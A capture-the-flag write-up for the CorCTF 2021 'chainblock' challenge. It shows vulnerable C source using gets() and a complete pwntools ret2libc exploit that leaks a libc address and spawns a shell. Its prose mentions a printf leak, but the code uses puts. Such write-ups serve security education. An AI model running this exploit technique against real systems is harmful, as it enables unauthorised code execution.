# CorCTF 2021 


## BlockChain

```
 Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'

```
We are given an a ELF binary file, its loader and libc version. We are also provided source code C :
```
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}

```

Read source code and we can understand flow of this.
Since binary file has no win funtion and we provided libc file so we have to used ret2libc attack.

First thing, we have to find the RIP offset from the start of the input buffer, we can basically crash the programm with a long enough input inside gdb and check the offset. 
It is 264. (256 + 8)

Next we have to leak a libc address to defeat the ASLR, we can jump to printf@plt and pass as parameter the address of printf@got. 
Once we leaked the address we can calculate the libc base address.

After the leak we have to perform another buffer overflow, so let's jump to main and craft another ROP-chain. 
Now we just need to jump to system and pass the address of */bin/sh* as parameter to the function. We can find system funtion offset in libc file.

Sometimes the rop-chain won't work because printf and system function crash. That happens because the stack is not aligned to 16 byte, to fix this issue we can put a ret gadget as the first gadget, 
so it will pop 8 bytes from the stack and fix the alignment.

```
from pwn import * 

BIN = "./chainblock"
libc = ELF("libc.so.6")
elf = ELF(BIN)
name = b"Techlead "
pop = 0x0000000000401493 #pop rdi ; ret
ret = 0x000000000040101a

def exploit():
	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(elf.symbols['got.puts'])
	payload += p64(elf.symbols['plt.puts'])
	payload += p64(elf.symbols['main'])
	io.sendline(payload)
	io.recvuntil('KYC failed, wrong identity!\n')
	puts = u64((io.recv(6)+b'\x00'*2))

	libc_base = puts - libc.symbols['puts']
	print("Libc base:", hex(libc_base))
	sys_offset = libc.symbols['system']
	bin_offset = next(libc.search(b"/bin/sh"))
	sys_call = libc_base + sys_offset
	bin_call = libc_base + bin_offset

	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(bin_call)
	payload += p64(ret)
	payload += p64(sys_call)
	io.sendline(payload)
	io.interactive()
	

io = process(BIN)
#io = remote('pwn.be.ax',5000)
exploit()
```


